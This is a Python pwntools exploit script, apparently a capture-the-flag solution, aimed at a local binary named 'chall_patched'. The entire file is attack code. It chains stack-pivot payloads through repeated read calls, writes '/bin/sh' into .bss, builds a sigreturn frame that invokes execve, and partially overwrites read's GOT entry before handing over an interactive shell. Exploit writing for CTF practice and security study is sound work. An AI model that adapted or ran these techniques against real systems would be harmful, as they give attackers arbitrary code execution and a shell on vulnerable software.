#!/usr/bin/env python3

import argparse

from pwn import (
    ELF,
    SigreturnFrame,
    constants,
    context,
    flat,
    process,
    raw_input,
    remote,
)

parser = argparse.ArgumentParser()
parser.add_argument("-L", "--local", action="store_true", help="Run locally")
parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
args = parser.parse_args()


FILE = "./chall_patched"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
libc = elf.libc


def mangle(pos, ptr, shifted=1):
    if shifted:
        return pos ^ ptr
    return (pos >> 12) ^ ptr


def demangle(pos, ptr, shifted=1):
    if shifted:
        return mangle(pos, ptr)
    return mangle(pos, ptr, 0)


def launch(argv=None, envp=None):
    global target, thread

    if argv is None:
        argv = [FILE]

    if args.local and args.threads is not None:
        raise ValueError("Options -L and -T cannot be used together.")

    if args.local:
        if args.gdb and "qemu" in argv[0]:
            if "-g" not in argv:
                argv.insert(1, str(args.port))
                argv.insert(1, "-g")
        target = process(argv, env=envp)
    elif args.threads:
        if args.threads <= 0:
            raise ValueError("Thread count must be positive.")
        process(FILE)

        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
    else:
        target = remote(HOST, PORT, ssl=True)


def arbitrary_size_read(target, frame, size, read_addr, base_addr):
    for i in range(0, size, 0x10):
        offset = (i // 0x10) * 0x10

        payload1 = flat(
            {
                0x0: b"X" * 0x10,
                0x10: (base_addr + offset) + 0x10,
                0x18: read_addr,
            },
            filler=b"\x00",
        )
        target.send(payload1)

        chunk = frame[i : i + 0x10]
        if len(chunk) < 0x10:
            chunk = chunk.ljust(0x10, b"\x00")

        payload2 = flat(
            {
                0x0: chunk,
                0x10: (base_addr + 0x20 + offset) + 0x10,
                0x18: read_addr,
            },
            filler=b"\x00",
        )
        target.send(payload2)


def main():
    launch()

    read = elf.sym["main"] + 0x8
    pop_rax_ret = 0x401126
    ret = pop_rax_ret + 0x1

    payload = flat(
        {
            0x10: 0x404038 + 0x10,
            0x18: read,
        },
        filler=b"\x00",
    )
    raw_input("DEBUG")
    target.send(payload)

    payload = flat(
        {
            0x0: elf.sym["main"],
            0x10: 0x404018 + 0x10,
            0x18: read,
        },
        filler=b"\x00",
    )
    raw_input("DEBUG")
    target.send(payload)

    payload = flat(
        {
            0x0: pop_rax_ret,
            0x18: ret,
        },
        filler=b"\x00",
    )
    raw_input("DEBUG")
    target.send(payload)

    payload = flat(
        {
            0x0: read,
            0x10: elf.bss() + 0x500 + 0x10,
            0x18: read,
        },
        filler=b"\x00",
    )
    raw_input("DEBUG")
    target.send(payload)

    payload = flat(
        {
            0x0: b"/bin/sh\x00",
            0x10: 0x404020 + 0x10,
            0x18: read,
        },
        filler=b"\x00",
    )
    raw_input("DEBUG")
    target.send(payload)

    payload = flat(
        {
            0x0: 0xF,
            0x8: elf.plt["read"],
            0x10: elf.bss() + 0x300,  # junk
            0x18: read,
        },
        filler=b"\x00",
    )
    raw_input("DEBUG")
    target.send(payload)

    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = elf.bss() + 0x500
    frame.rsi = 0
    frame.rdx = 0
    frame.rsp = 0x404030
    frame.rip = elf.plt["read"]
    frame = bytes(frame)

    target.hexdump(frame)
    target.success(f"frame len: {hex(len(frame))}")

    arbitrary_size_read(target, frame, len(frame), read, 0x404030)

    payload = flat(
        {
            0x10: elf.bss() + 0x800,
            0x18: read,
        },
        filler=b"\x00",
    )
    raw_input("DEBUG")
    target.send(payload)

    payload = flat(
        {
            0x10: elf.got["read"] + 0x10,
            0x18: read,
        },
        filler=b"\x00",
    )
    raw_input("DEBUG")
    target.send(payload)
    raw_input("DEBUG")
    target.send(b"\xdb")

    target.interactive()


if __name__ == "__main__":
    main()
